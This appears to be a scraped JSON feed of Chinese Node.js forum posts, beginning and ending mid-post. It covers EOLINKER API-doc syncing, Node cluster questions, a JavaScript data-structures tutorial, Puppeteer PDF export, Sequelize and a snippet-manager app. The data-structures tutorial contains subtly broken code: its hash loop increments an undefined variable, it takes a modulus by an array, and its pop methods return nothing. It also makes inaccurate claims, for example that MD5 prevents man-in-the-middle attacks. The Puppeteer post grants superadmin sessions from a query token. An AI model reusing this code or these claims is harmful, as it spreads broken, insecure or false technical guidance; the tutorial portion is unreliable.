EOLINKER 后会有 mock、详细文档等数据。假如现在你的 GitLab 仓库有 ABCD 四个接口，在 EOLINKER 有 A 一个接口。</strong></p>\n<ul>\n<li>采用“增量更新”后，EOLINKER 上将新增 BCD 三个接口；如果仓库A接口的数据有所更新，那么在保持原有本地A接口的 mock、详细文档数据的同时，本地亦将新增相应更新的数据；</li>\n<li>采用“全量更新”后，EOLINKER 上将有 ABCD 四个接口；此时本地A 接口所有数据都不保留，而会与仓库中A接口的数据保持一致；</li>\n<li>采用“仅添加新的 API”后，EOLINKER将以接口名称来判断是否需要添加新的API，因此EOLINKER上将新增 BCD 三个接口；即便 GitLab 上的参数已经改变，但本地原有的A接口数据不变；</li>\n</ul>\n<p><strong>因此，无论是什么情况都推荐采用增量更新。不过即便你还是误操作了，EOLINKER都会自动生成API历史版本，方便我们回滚文档，操作失误也不怕了。</strong></p>\n<h4>1.根据官方的说明，在设置完成点击立即同步后，文档即会开始进行同步，而同步生成文档所需的时间，则根据代码注释的数据量来决定。</h4>\n<p><img src=\"//static.cnodejs.org/FlUMWcmrwgDTVfWYnWbyMiXxgip8\" alt=\"图11点击立即同步.png\"></p>\n<h4>2.API文档和对应的分组都被自动生成了，如下图。</h4>\n<p><img src=\"//static.cnodejs.org/FpWGFFfE8U1kRfF7d7S27YscAvUK\" alt=\"图12API文档和分组被自动生成.png\"></p>\n<h4>3.那我们就可以直接编辑修改文档了，实在是方便了很多。</h4>\n<p><img src=\"//static.cnodejs.org/Fh9KQZR6QOvcM0vE6CbhwZw1CQX5\" alt=\"图13编辑文档.png\"></p>\n<p><strong>补充一句：按照他们的更新速度，目前也已经支持读取gitlab上java代码了，操作步骤跟读取php的步骤类似，这里就不展开说了，还不知道请回头再看一遍文章hhh。</strong></p>\n<h4>总结</h4>\n<p>如果可以通过扫描代码注释自动生成API文档，写完代码注解后就不用再一条一条的写接口文档，现在又有一个理由可以不再使用swagger了。新增的这个功能可以减轻大部分不必要的工作量，虽然现在只能支持gitlab上的php代码和java代码，但后续肯定还会继续支持更多的平台和编程语言代码，持续使用起来将会更加方便和快捷，希望eolinker能够给我们带来更多的惊喜。官网地址：<a href=\"https://s.growingio.com/gNX03Z\">https://www.eolinker.com</a></p>\n</div>","title":"试试使用 eolinker 扫描 GitLab 代码注释自动生成 API 文档？","last_reply_at":"2019-03-26T03:07:07.447Z","good":false,"top":false,"reply_count":0,"visit_count":513,"create_at":"2019-03-26T03:07:07.447Z","author":{"loginname":"wardennn","avatar_url":"https://avatars0.githubusercontent.com/u/33686934?v=4&s=120"}},{"id":"5c98990000bcfd7eb2be5f13","author_id":"5c98967000bcfd7eb2be5ee3","tab":"share","content":"<div class=\"markdown-text\"><p>命令行是一项通用技能，如果你掌握了它，将对你的工作带来极大便利。希望这本书能够帮到你，使你的技能树更茂盛。全书包括 7 章，总共 112 页。提供 PDF、ePub 及 Mobi 格式，可在 PC 和移动端阅读。</p>\n<p><a href=\"https://selfhostedserver.com/usingcli-book\">https://selfhostedserver.com/usingcli-book</a></p>\n</div>","title":"《像黑客一样使用命令行》电子书","last_reply_at":"2019-03-25T11:06:51.292Z","good":false,"top":false,"reply_count":1,"visit_count":767,"create_at":"2019-03-25T09:01:52.808Z","author":{"loginname":"xuxiaodong","avatar_url":"https://avatars1.githubusercontent.com/u/15364?v=4&s=120"}},{"id":"5c9465d400bcfd7eb2be4e89","author_id":"4efc278625fa69ac69000229","tab":"ask","content":"<div class=\"markdown-text\"><p>前两年在边锋开发“侠客风云传”和棋牌游戏的时候用过，但是很少听说其它公司或项目用。感觉找工作和招人都不容易。用Node最多的还是前端开发。最近应聘的两家都是想做小游戏的，要求挺高但是待遇或地位不怎么样。</p>\n</div>","title":"游戏后端用Node的多吗？","last_reply_at":"2019-03-25T10:51:19.643Z","good":false,"top":false,"reply_count":10,"visit_count":1204,"create_at":"2019-03-22T04:34:28.211Z","author":{"loginname":"lushisang","avatar_url":"https://avatars0.githubusercontent.com/u/197572?v=4&s=120"}},{"id":"5c91ae4b8a587f26b426cb63","author_id":"5c91ace496558e26e1b677bd","tab":"ask","content":"<div class=\"markdown-text\"><p>我对于nodejs的多请求处理有些疑惑，希望有人能帮我解答一下。</p>\n<p>1、nodejs 中的cluster是如何均衡负载请求的？\n例如我有1000个请求同时发送到服务器，但是我的服务器只有16核，按照cluster的写法此时我应该有16个worker进程来监听相关事件，那么我这1000个请求是如何分配到16个子进程上的呢？</p>\n<p>2、假如我现在有16个子进程，但是现在请求较少，例如只有10个请求会让我处理，那么剩余6个子进程空闲是否属于资源闲置？我能否利用这六个空闲的进程来处理工作进程中的任务?</p>\n<p>这是我的一些疑惑和设想，希望大家能够指导一下</p>\n</div>","title":"关于Nodejs中cluster的问题","last_reply_at":"2019-03-25T09:02:51.183Z","good":false,"top":false,"reply_count":2,"visit_count":725,"create_at":"2019-03-20T03:06:51.775Z","author":{"loginname":"HyperClockUp","avatar_url":"https://avatars2.githubusercontent.com/u/36909196?v=4&s=120"}},{"id":"5c94839700bcfd7eb2be4f4f","author_id":"5732e4852e11c7a80c33f8aa","tab":"ask","content":"<div class=\"markdown-text\"><p>nodejs服务需要不断的定期发送request请求，那么UV_THREADPOOL_SIZE设置为多少比较合适？对服务性能有什么影响，有没有实际操作过的？麻烦帮忙解答一下。</p>\n</div>","title":"对于大并发请求的node服务，调整UV_THREADPOOL_SIZE到多大比较合适？","last_reply_at":"2019-03-25T08:07:54.456Z","good":false,"top":false,"reply_count":2,"visit_count":514,"create_at":"2019-03-22T06:41:27.976Z","author":{"loginname":"evershy","avatar_url":"https://avatars2.githubusercontent.com/u/9037313?v=4&s=120"}},{"id":"5c9842ad00bcfd7eb2be5ae5","author_id":"5c98426500bcfd7eb2be5add","tab":"share","content":"<div class=\"markdown-text\"><h1>JavaScript中的数据结构</h1>\n<h2>Intruduction</h2>\n<p>随着业务逻辑越来越多的从后端转向前端,专业的前端工程知识变的更加关键。作为前端的工程师，我们依赖像<strong>React</strong>这样的库来开发view层,同时又依赖<strong>Redux</strong>这样的库来管理数据状态，两者组合起来作为响应式编程，当数据动态变化时，UI层可以实时的更新。渐渐地，后端可以专注于api的开发，仅仅提供数据的检索和更新。这样实际上，后端只是将数据库转发到前端，前端工程师处理所有的逻辑，微服务和graphql的日益增长证明了这个趋势。</p>\n<p>如今，前端工程师不仅要精通html和css，也要精通JavaScript。随着客户端的数据存储成为服务器端数据库的“副本”，熟悉惯用数据结构就变得至关重要。事实上，工程师的经验水平可以从他/她区分何时以及为什么使用特定数据结构的能力中推断出来。</p>\n<pre class=\"prettyprint\"><code>Bad programmers worry about the code. Good programmers worry about data structures and their relationships.  \n\n— Linus Torvalds, Creator of Linux and Git\n</code></pre><p>在高等级上，有3中类型的数据结构, 栈和队列是类数组的结构，它们只是在插入和删除数据上有所不同。链表、树和图是拥有节点的结构，并且节点有对其他节点的指针。哈希表依赖哈希函数保存和定位数据。</p>\n<p>就复杂性而言，队列和栈是最简单的,可以由链表构造，树和图是最复杂的，因为它们在链表的结构上进行了扩展。哈希表需要利用这些数据结构来可靠地执行。就效率而言，链表最适合\b记录和存储数据，哈希表最适合检索数据。</p>\n<p>下文将解释并说明应该在何时使用这些数据结构。</p>\n<h3>Stack</h3>\n<p>可以说JavaScript中最重要的堆栈是调用堆栈，每当函数执行时，会把函数的作用域推入栈中。在编程方式上而言，栈只是一个包含pop和push操作的数组结构,<strong>Push</strong>增加元素到数组的顶端,<strong>Pop</strong>移除数组元素在相同的位置,换句话说，栈结构遵循“后进先出”的原则(LIFO)。</p>\n<pre class=\"prettyprint language-js\"><code>class Stack {\n  constructor() {\n    this.list = []\n  }\n\n  push(...item) {\n    this.list.push(...item)\n  }\n\n  pop() {\n    this.list.pop()\n  }\n}\n</code></pre><h3>Queue</h3>\n<p>JavaScript是一种事件驱动的编程语言，它支持非阻塞操作。在浏览器内部，只有一个线程来运行所有的JavaScript代码,使用事件循环来注册事件,为了支持单线程环境中的异步性(为了节省CPU资源和增强web体验)，回调函数只有在调用堆栈为空时才会退出队列并执行。<strong>Promise</strong>依赖于这个事件驱动的体系结构，允许异步代码的“同步风格”执行，而不会阻塞其他操作。</p>\n<p>在编程方式上而言，队列是只包含一个unshift和pop操作的数组结构,<strong>Unshift</strong>将数据项加入队列的末尾，<strong>Pop</strong>从数组的顶部将元素出列,换句话说，队列遵循“先进先出”的\b原则（FIFO）。</p>\n<pre class=\"prettyprint language-js\"><code>class Queue {\n  constructor() {\n    this.list = []\n  }\n\n  enqueue(...item) {\n    this.list.unshift(...item)\n  }\n\n  dequeue() {\n    this.list.pop()\n  }\n}\n</code></pre><h3>Linked List</h3>\n<p>与数组相似，链表按顺序存储数据元素。链表不保存索引，而是保存指向其他数据项的指针。第一个节点成为头节点，最后一个节点成为尾节点。在单链表中，每个节点只有指向下一个节点的指针，头部是每次检索开始的地方，在双链表中，每个节点还有指向前一个节点的指针,因此双链表可以从尾部开始向前检索。</p>\n<p>\b链表在插入和删除元素时有固定的时间，因为可以改变指针。但是在数组中执行相同的操作需要线性时间，因为后续需要移位。此外，只要有空间，链表就可以增长。然而，即使是自动调整大小的“动态”数组也可能变得异常昂贵。但是要查找或编辑链表中的元素，我们可能需要遍历整个长度，这等于线性时间。然而，对于数组索引来说，这样的操作是微不足道的。</p>\n<p>与数组一样，单链表也可以作为堆栈来操作,只要让头部成为唯一可以插入和移除元素的地方。双链表可以作为队列来操作，只要在尾部插入元素，在头部移除元素。对于大量的数据来说，这种实现队列的方法比数组性能更好，因为数组的<strong>shift</strong>和<strong>unshift</strong>操作需要线性的时间在后续重新索引每个元素。</p>\n<p>链表结构在客户端和服务端都是常用的。在客户端，像<strong>Rudex</strong>这样的状态管理库以链表的方式构建其中间件逻辑。当<strong>action</strong>被<strong>dispatch</strong>后，它们从一个中间件到另外一个中间件直到到达<strong>ruducer</strong>。在服务端，像<strong>Express</strong>这样的web框架也以类似的方式构造它的中间件逻辑,当一个<strong>request</strong>到达时，它会按顺序从一个中间件到另一个中间件，直到发出响应。</p>\n<h5>单链表的简单实现</h5>\n<pre class=\"prettyprint language-js\"><code>class LinkList {\n  constructor() {\n    this.head = null\n  }\n\n  find(value) {\n    let curNode = this.head\n    while (curNode.value !== value) {\n      curNode = curNode.next\n    }\n    return curNode\n  }\n\n  findPrev(value) {\n    let curNode = this.head\n    while (curNode.next!==null &amp;&amp; curNode.next.value !== value) {\n      curNode = curNode.next\n    }\n    return curNode\n  }\n\n  insert(newValue, value) {\n    const newNode = new Node(newValue)\n    const curNode = this.find(value)\n    newNode.next = curNode.next\n    curNode.next = newNode\n  }\n\n  delete(value) {\n    const preNode = this.findPrev(value)\n    const curNode = preNode.next\n    preNode.next = preNode.next.next\n    return curNode\n  }\n}\n\nclass Node {\n  constructor(value, next) {\n    this.value = value\n    this.next = null\n  }\n}\n</code></pre><h3>Hash Table</h3>\n<p>哈希表\b类似于字典结构，由键值对组成。每个对在内存中的地址有一个<strong>哈希</strong>函数确定,该函数接受一个key作为参数，并返回一个检索该对的内存地址。如果两个或者多个key转为相同的地址，则可能会发送冲突。为了健壮性，getter和setter应该预测这些事件，以确保所有数据都可以恢复，并且没有覆盖任何数据。</p>\n<p>如果已经知道的地址是整数序列，可以简单地使用数组来存储键值对。对于更复杂的映射，我们可以使用<strong>maps</strong>或者<strong>objects</strong>, 哈希表的插入和查找元素的时间平均为常数，如果key表示地址，就不需要散列，一个简单的对象就足够了。哈希表实现键和值之间的简单对应，键和地址之间的简单关联，但是牺牲了数据之间的关系。所以，哈希表在存储数据方面不是最优的。</p>\n<p>如果一个应用倾向于检索而不是存储数据，那么在查找、插入和删除方面，没有其他数据结构能够与哈希表的速度相匹配。因此\b哈希表被广泛应用也就不足为奇了。从数据库到\b服务端，再到\b客户端，哈希表尤其是哈希函数对应用程序的性能和安全方面是至关重要的。<strong>数据库的查询</strong>速度很大程度上依赖于指向记录的索引按顺序保存。这样，二进制搜索就可以在对数时间内完成，特别是对于<strong>大的数据</strong>来说，这是一个巨大的性能优势。</p>\n<p>在客户端和服务端,许多流行的库都用缓存来最大程度提升性能。通过在哈希表中保存输入和输出的记录,对于\b相同的输入，函数仅运行一次。流行的<strong>Reselect</strong>库使用这种缓存策略来优化启动了<strong>Redux</strong>应用程序的<strong>mapStateToProps</strong>函数。实际上，JavaScript引擎还利用名为调用栈的哈希表存储所有我们创建的变量。这些变量可以通过调用栈上的指针被访问到。</p>\n<p>互联网本身也依赖于哈希算法来安全运行。\b互联网的结构是这样的：任何计算机都可以通过互相连接的web设备与其他计算机通信。每当一个设备登录到互联网上，它也可以成为一个路由器，数据流可以通过它进行传输。然而这是一把双刃剑。分散式架构意味着网络中的任何设备都可以监听并篡改它帮助转发的数据包。<strong>MD5</strong>和<strong>SHA256</strong>等哈希函数在防止中间人攻击方面发挥着关键作用。HTTPS上的电子商务之所以安全，只是因为使用了这些散列函数。</p>\n<p>受Internet的启发，<strong>区块链</strong>技术通过使用哈希函数对每个区块的数据创建一个不可变的“指纹”，本质上建立了一个可以在web上被公开的完整数据库，任何人都可以查看和贡献。从结构上看，<strong>区块链</strong>就是\b加密散列的二叉树单链表。哈希非常神秘，任何人都可以创建和更新一个财务交易数据库。曾经只有政府和中央银行才能做到的事情，现在任何人都可以安全地创造自己的货币!</p>\n<p>随着越来越多的数据库走向开放，要求前端工程师可以抽象出所有底层密码的复杂性。在未来，应用程序主要的区别将是用户体验。</p>\n<p>一个简单的不做冲突处理的哈希表</p>\n<pre class=\"prettyprint language-js\"><code>class HashTable {\n  constructor(size) {\n    this.table = new Array(size)\n  }\n  hash(key) { &#x2F;&#x2F; hash函数\n    &#x2F;&#x2F; 将字符串中的每个字符的ASCLL码值相加，再对数组的长度取余\n    let total = 0\n    for (let i = 0; i &lt; key.length; k++) {\n      total += key.charCodeAt(i)\n    }\n    return total % this.table\n  }\n  insert(key, value) {\n    const hashKey = this.hash(key)\n    this.table[hashKey] = value\n  }\n  get(key) {\n    const hashKey = this.hash(key)\n    if (!this.table[hashKey]) {\n      return null\n    }\n    return this.table[hashKey]\n  }\n  getAll() {\n    const table = []\n    for (let i = 0; i &lt; this.table.length; i++) {\n      if (this.table[i] != undefined) {\n        table.push(this.table[i])\n      }\n    }\n    return table\n  }\n}\n</code></pre><h3>总结</h3>\n<p>这些数据结构可以在任何地方被找到，从数据库到服务端再到前端，甚至JavaScript引擎自身。随着逻辑层越来越多的从后端移向前端，前端的数据层变得至关重要。对这一层的恰当的管理需要掌握逻辑所依赖的数据结构。没有一种数据结构适合所有情况，因为对一个属性进行优化总是会影响另外的属性。一些数据结构对于存储数据是非常高效的，然而另外的数据结构对于搜索元素来说更加高效。在一种极端情况下，<strong>链表</strong>是存储的最佳选择，可以被分成堆栈和队列(线性时间)。另一方面，没有其他结构可以匹配哈希表的搜索速度(常数时间)。树的结构性能位于两者之间(对数时间)，图表可以描述自然界最复杂的结构。</p>\n</div>","title":"JavaScript中的几种常用数据结构","last_reply_at":"2019-03-25T02:53:33.595Z","good":false,"top":false,"reply_count":0,"visit_count":508,"create_at":"2019-03-25T02:53:33.595Z","author":{"loginname":"lvwxx","avatar_url":"https://avatars2.githubusercontent.com/u/15207681?v=4&s=120"}},{"id":"5c8f03c07ce0df3732429187","author_id":"597ee3db68aa87c774e5edac","tab":"share","content":"<div class=\"markdown-text\"><h2>现状</h2>\n<p><a href=\"https://ppt.baomitu.com/\">声享</a>是一个基于 <a href=\"https://thinkjs.org/\">ThinkJS</a> 开发的在线制作 PPT 平台。声享制作的 PPT 支持代码高亮、图片上传、神奇效果等功能，同时你可以在声享收藏自己喜欢的 PPT 、对自己的 PPT 进行分类管理。其中有一个 PDF 导出的功能，可以将自己制作的 PPT 导出成 PDF 保存到本地。</p>\n<p>功能实现比较简单，只是提供了一个页面，用户需要手动去打印成 PDF。这个方案存在一些问题：</p>\n<ol>\n<li>由于使用了 iframe 懒加载导致未加载的 iframe 无法正常显示。</li>\n<li>该种方案只能打印所有页面的初始状态。如果页面中存在切换动画，可能会丢失部分 PPT 信息。</li>\n<li>需要用户手动操作，提高了使用难度。</li>\n</ol>\n<p>如果是前端来生成 PDF，这些问题基本可以得到解决，但是开发量比较大而且存在一个效率问题。如果 PPT 页面存在多个 iframe，PDF 的生成时间过长会让用户长时间等待，明显不太合适。最终还是决定服务端来生成 PDF，才有了后来 Puppeteer 的尝试。</p>\n<h2>Puppeteer</h2>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/18/1698ea0e82d817b5?w=1200&amp;h=630&amp;f=png&amp;s=548703\" alt=\"t0141d1aa3573ceb40e.png\"></p>\n<p>什么是<a href=\"https://github.com/GoogleChrome/puppeteer\">Puppeteer</a>呢？官方给的解释是：</p>\n<blockquote>\n<p>Puppeteer is a Node library which provides a high-level API to control Chrome or Chromium over the <a href=\"https://chromedevtools.github.io/devtools-protocol/\">DevTools Protocol</a>. Puppeteer runs <a href=\"https://developers.google.com/web/updates/2017/04/headless-chrome\">headless</a> by default, but can be configured to run full (non-headless) Chrome or Chromium.</p>\n</blockquote>\n<p>简而言之，这货是一个提供高级 API 的 node 库，能够通过 devtool 控制 headless 模式的 Chrome 或者 Chromium，它可以在 headless 模式下模拟任何的人为操作。通过它我们可以实现：</p>\n<ol>\n<li>生成页面的截图或者 PDF</li>\n<li>抓取 SPA（单页应用）并生成预渲染内容（即“SSR”（服务器端渲染））。</li>\n<li>自动提交表单，进行 UI 测试，键盘输入等。\n…</li>\n</ol>\n<p>通过 Puppeteer，我们可以直接使用 Chrome 把我们需要的内容导出为 PDF。对比以前的实现方式有以下优点：</p>\n<ol>\n<li>不需要用户手动操作，服务端生成 PDF 后直接以邮件的方式发送给用户。</li>\n<li>PPT 中的动画可以模拟用户翻页的动作触发，然后以初始、结束两张 PDF 的方式展示，不会丢失 PPT 内容。</li>\n<li>不需要考虑图片/ iframe 跨域等问题。</li>\n</ol>\n<p>可以说 Puppeteer 完美的解决来我们一期 PDF 导出存在的问题。</p>\n<h2>解决方案</h2>\n<p>我们基本的实现思路是：</p>\n<ol>\n<li>打开一个正常的 PPT 播放页，获取需要打印的 DOM 元素并翻页 。</li>\n<li>重复第一步操作直至到最后一页 。</li>\n<li>清空页面内容并将前两步获得的页面内容依次填充到当前页面（为什么要依次填充会在后面解释）。</li>\n</ol>\n<p>对应上述方案实现的部分代码如下：</p>\n<ol>\n<li>通过 Puppeteer 打开指定的页面</li>\n</ol>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; 测试时建议headless设置为false，以便可以直观看到页面效果\nthis.browser = await puppeteer.launch({headless: this.isDebug});\nthis.page = await this.browser.newPage();\nawait this.page.goto(&#x27;https:&#x2F;&#x2F;xxxxx.com&#x27;, { waitUntil:&#x27;networkidle2&#x27; });\n</code></pre><ol>\n<li>打开页面后可以通过 Puppeteer 模拟用户翻页操作，每次翻页后缓存需要打印的 DOM 元素字符串。</li>\n</ol>\n<pre class=\"prettyprint\"><code>let canNext;\nlet i = 0;\nconst content = {};\ndo {\n    canNext = await this.page.$(&#x27;.navigate-right.enabled&#x27;);\n    const iframes = await this.page.$$(&#x27;.PluginPage.present iframe&#x27;).length;\n    content[i++] = {\n        iframe: iframes,\n        domStr: await this.page.$eval(&#x27;.RevealViewPort&#x27;, el =&gt; el.outerHTML)\n    }\n    if (canNext) {\n        await this.page.click(&#x27;.navigate-right&#x27;);\n        &#x2F;&#x2F; 等待翻页动画\n        await this.page.waitFor(1000);\n    }\n} while (canNext);\n</code></pre><ol>\n<li>获取到要打印的所有页面 DOM 后，替换掉原来的页面内容。因为 $evaluate 方法中不支持调用外部变量所以只能以传参的方式使用。</li>\n</ol>\n<pre class=\"prettyprint\"><code>this.page.evaluate(domStr =&gt; document.body.innerHTML = domStr, content);\n</code></pre><ol>\n<li>调用生成 PDF 的 API</li>\n</ol>\n<pre class=\"prettyprint\"><code>this.page.pdf({\n    path: path.join(think.ROOT_PATH, &#x27;runtime&#x2F;xxx.pdf&#x27;),\n    format: &#x27;A4&#x27;,\n    landscape: true,\n    printBackground: true &#x2F;&#x2F;如果要显示背景，此属性要设置为true\n})\n</code></pre><ol>\n<li>使用 nodemailer 发送邮件给用户。这一步如果想使用本地的 SMTP 服务请用 nodemailer 的 2.7.5 的版本，此版本后这项功能被删除了。</li>\n</ol>\n<pre class=\"prettyprint\"><code>let transporter = nodemailer.createTransport({\n    host: &#x27;smtp.ym.163.com&#x27;,\n    port: 994,\n    secure: true,\n    auth: {\n        user: &#x27;xxx@xxx.com&#x27;,\n        pass: &#x27;xxx&#x27;\n    }\n});\ntransporter.sendMail({\n    from: &#x27;xxx@xxx.com&#x27;,\n    to: &#x27;xxx@xxx.com&#x27;,,\n    subject: &#x27;【声享】xxx&#x27;,\n    attachments: [{\n        filename: &#x27;xxx.pdf&#x27;,\n        path: path.join(think.ROOT_PATH, &#x27;runtime&#x2F;xxx.pdf&#x27;),\n        contentType: &#x27;application&#x2F;pdf&#x27;\n    }]\n})\n</code></pre><h2>开发中需要注意的问题</h2>\n<ol>\n<li>用户登录\n使用 Puppeteer 打开页面相当于你新启动了一个浏览器实例，页面中的 seession 和 cookie 是空的。而打印所用的页面需要用到用户信息，所以我们登录了一个超管帐号来执行打印操作。在 ThinkJS 中可以通过中间件来实现这项功能。在访问页面的时候通过参数校验判断是否是打印而打开的页面，如果是则登录超管帐号。</li>\n</ol>\n<pre class=\"prettyprint\"><code>\n&#x2F;&#x2F; 打开指定页面时通过校验后面参数判断是否以超管登录\nmodule.exports = options =&gt; {\n    return async (ctx, next) =&gt; {\n        const { token, ctime } = ctx.query;\n        const md5Str = tockenGenerator();\n        if (md5Str === token) {\n            await ctx.session(&#x27;userInfo&#x27;, adminUser);\n        }\n        return next();\n    };\n};\n\n</code></pre><ol>\n<li>Puppeteer 启动</li>\n</ol>\n<p>如果服务端是运行在 root 权限下，在启动 Puppeteer 时要添加 --no-sandbox 参数，否则 Chrome/Chromium 会启动失败。详情见 <a href=\"https://crbug.com/638180\">Running as root without — no-sandbox is not supported</a>。这个权限问题在linux以root用户使用 Chrome 的时候同样适用。</p>\n<pre class=\"prettyprint\"><code>\nthis.browser = await puppeteer.launch({args:[&#x27;--no-sandbox&#x27;]});\n\n\n</code></pre><ol>\n<li>iframe 无法加载</li>\n</ol>\n<p>声享支持页面内嵌入 iframe，在打印的时候碰到一个问题。如果同时在页面上插入 iframe 过多，后面的 iframe 会直接卡住不再加载。所以 iframe 最好分批插入或者一个一个插入，同时设定10秒来加载iframe。 如果想精确控制 iframe 也可以使用 API 等待 iframe 完全加载再执行后续操作。</p>\n<pre class=\"prettyprint\"><code>\nfor (let i = 0; i &lt; pages.length; i++) {\n    const page = pages[i];\n    await this.page.$evaluate(content =&gt; {\n        const divDom = document.createElement(&#x27;div&#x27;);\n        divDom.innerHTML = content;\n        document.body.appendChild(divDom.childNodes[0])\n    }, page.domStr);\n    if (page.iframe) await this.page.waitFor(10000 * page.iframe);\n}\n\n</code></pre></div>","title":"使用 Puppeteer 导出声享 PPT","last_reply_at":"2019-03-25T02:22:20.464Z","good":false,"top":false,"reply_count":1,"visit_count":450,"create_at":"2019-03-18T02:34:40.206Z","author":{"loginname":"lizheming","avatar_url":"https://avatars2.githubusercontent.com/u/424491?v=4&s=120"}},{"id":"5c98361cfd41137eb7661228","author_id":"53b25565399ed9e07d1e8793","tab":"ask","content":"<div class=\"markdown-text\"><p>有一个通知表Notification，里面有两个user对象，一个是通知发出者user, 一个是通知接收者 targetUser, 这两个字段都关联着User表，查询方法如下</p>\n<p>model</p>\n<pre class=\"prettyprint language-js\"><code>notification_model.belongsTo(user_model, { foreignKey: &#x27;user&#x27; });\nnotification_model.belongsTo(user_model, { foreignKey: &#x27;targetUser&#x27; });\n</code></pre><p>service</p>\n<pre class=\"prettyprint language-js\"><code>  notification_model.findAll({\n    include: [ { model: user_model } ],\n    where: { is_read: false }\n  });\n</code></pre><p>这样查出来的结果只有user对象有数据，targetUser是undefined，请教大佬解惑</p>\n</div>","title":"【已解决】sequelize关联查询问题请教","last_reply_at":"2019-03-25T02:20:09.681Z","good":false,"top":false,"reply_count":1,"visit_count":373,"create_at":"2019-03-25T01:59:56.200Z","author":{"loginname":"tomoya92","avatar_url":"https://avatars2.githubusercontent.com/u/6915570?v=4&s=120"}},{"id":"5c979c9bfd41137eb7661096","author_id":"571b8f265a26c4a841ecbc4e","tab":"share","content":"<div class=\"markdown-text\"><h1>CodeExpander</h1>\n<p><code>CodeExpander</code>是一个智能并具有像 TextExpander 特性的 GitHub Gist 客户端。它保存和管理需要重复输入的文本或脚本段，并可通过设置缩写自动扩展。</p>\n<p>访问官网：<a href=\"https://codeexpander.com/\">https://codeexpander.com/</a></p>\n<p><img src=\"https://github.com/oncework/codeexpander/raw/en/.gitbook/assets/map-main.png\" alt></p>\n<h2>技术栈</h2>\n<p>Node.js / Electron / React / Dva / AntDesign …</p>\n<h2><strong>下载</strong></h2>\n<p>MacOS 10.14/10.13/10.12/10.11 (Mojave, High Sierra, Sierra…) <strong>Or</strong> Windows 7/8/10</p>\n<p><a href=\"https://github.com/oncework/codeexpander/releases\">https://github.com/oncework/codeexpander/releases</a></p>\n<h2>常见用例</h2>\n<p><img src=\"https://github.com/oncework/codeexpander/raw/en/.gitbook/assets/gene-snippet.gif\" alt=\"快速创建\"></p>\n<p><img src=\"https://github.com/oncework/codeexpander/raw/en/.gitbook/assets/gene-md.gif\" alt=\"动态脚本\"></p>\n<p><img src=\"https://github.com/oncework/codeexpander/raw/en/.gitbook/assets/fill-in%20%281%29.gif\" alt=\"回复邮件\"></p>\n<p><img src=\"https://github.com/oncework/codeexpander/raw/en/.gitbook/assets/custom-snippet.gif\" alt=\"自定义Snippet\"></p>\n<p><img src=\"https://github.com/oncework/codeexpander/raw/en/.gitbook/assets/search-bar.gif\" alt=\"搜索栏\"></p>\n<p><img src=\"https://github.com/oncework/codeexpander/raw/en/.gitbook/assets/gene-pic.gif\" alt=\"分享主题片段图片\"></p>\n<p>更多功能请亲自体验…</p>\n<h3>为何开发该软件？</h3>\n<p>开发的初衷，毕业两年多，自己在编程开发的过程中，经常会遇到输入重复性的操作和命令。第一次接触到类似的软件的时候，感觉到这些软件确实能够大大减少开发时间，至少避免让自己的脑子花去记起那些命令。Code Less, Think More.</p>\n<p>然而，我发现类似的软件一般都是国外制作，均有些不如意的地方：</p>\n<ul>\n<li>跨平台同步问题</li>\n<li>订阅的费用昂费(对于普通的学生来讲,大佬见笑)</li>\n<li>不能满足自己奇怪的想法(我感觉这个很关键)</li>\n<li>…</li>\n</ul>\n<p>所以，闲也闲着，就撸起本子 Coding …</p>\n<h3>为何对软件进行收费？</h3>\n<ul>\n<li>软件部分功能都是免费的，像片段的增删改查同步的管理是免费的。收费的是为了正常的产品迭代，因为作者也需要大量时间来做研究、开发、修复，以及为软件提供支持。</li>\n<li>我采用的是<code>买断制付费</code>，您只需要请我喝杯咖啡就能使用该软件的之前和之后的功能，另外因为我只是作为一名独立开发者，并不需要有像公司那般求生欲。这就足够了。</li>\n<li>当然，最开心的是自己的产品能帮助到其他人。</li>\n</ul>\n</div>","title":"毕业两年良心之作--不一样的代码片段管理软件 CodeExpander","last_reply_at":"2019-03-24T15:34:46.743Z","good":false,"top":false,"reply_count":2,"visit_count":568,"create_at":"2019-03-24T15:04:59.690Z","author":{"loginname":"xudaolong","avatar_url":"https://avatars0.githubusercontent.com/u/9654838?v=4&s=120"}},{"id":"5c5169953819b801aa5a2dd1","author_id":"58f837a3bbaf2f3f569be082","tab":"share","content":"<div class=\"markdown-text\"><p><strong>作者：</strong> 林水溶</p>\n<p><strong>博客：</strong> <a href=\"https://linshuirong.cn/\">https://linshuirong.cn</a></p>\n<blockquote>\n<p><strong>为了大家都能看懂相声中我想表达的东西，先声明下：</strong></p>\n<ol>\n<li>今早咪蒙发表一篇文章：《一个出身寒门的状元之死》（槽点满满）</li>\n<li>咪蒙曾发表过一篇文章：《我为什么支持实习生休学？》（槽点满满 plus）</li>\n</ol>\n</blockquote>\n<p><strong>进入正文：</strong></p>\n<hr>\n<blockquote>\n<p>实习生小A，来咪蒙老师公司三个月了。前段时间听从咪老师建议休了学，全职投入到了工作之中。</p>\n<p>实习生小B，刚来公司一周。受到小A学长和咪老师的鼓舞，也过段时间休学的打算。</p>\n</blockquote>\n<p>实习生小A：小B啊，你在这儿好好干。我准备联系下学校，看还能不能继续回去上学…（悲伤脸）</p>\n<p>实习生小B：你这咋回事儿啊？（震惊脸）</p>\n<p>实习生小A：唉…这个事儿吧，还得从前两天说起。（悲伤脸）前两天咪蒙老师给我安排个活儿。</p>\n<p>实习生小B：啥活啊？</p>\n<p>实习生小A：她让我给篇文章拟个标题，说准备发一篇爆款文章，让我给拟个配得上它身份的标题。</p>\n<p>实习生小B：那你就拟个呗，这有啥难的？小学三年级我们就开始写作文了，还怕它一个标题？</p>\n<p>实习生小A：要有你说的这么简单就好了。</p>\n<p>实习生小B：怎么了，难道还有要求？（疑问脸）</p>\n<p>实习生小A：真有！咪老师提了三点要求。</p>\n<p>实习生小B：哪三点？</p>\n<p>实习生小A：<strong>第一点：标题一定要引发好奇</strong></p>\n<p>实习生小B：这很有道理啊。（认真脸）</p>\n<p>实习生小A：还给我举了个例子：<strong>《一夜之间，北京的井盖全消失了》</strong></p>\n<p>实习生小B：咦，这是怎么回事？北京的井盖怎么会在一夜之间全消失呢？（好奇脸）</p>\n<p>实习生小A：你看你看。只要是个人，看到这样的标题他都会好奇不是。</p>\n<p>实习生小B：有道理。但北京的井盖怎么会在一夜之间全消失呢？你说河南人…（纠结脸）</p>\n<p>实习生小A：打住打住，哪儿跟哪儿啊。井盖怎么消失的根本不重要好吗。重要的是这个标题能在第一时间抓住你的视线。</p>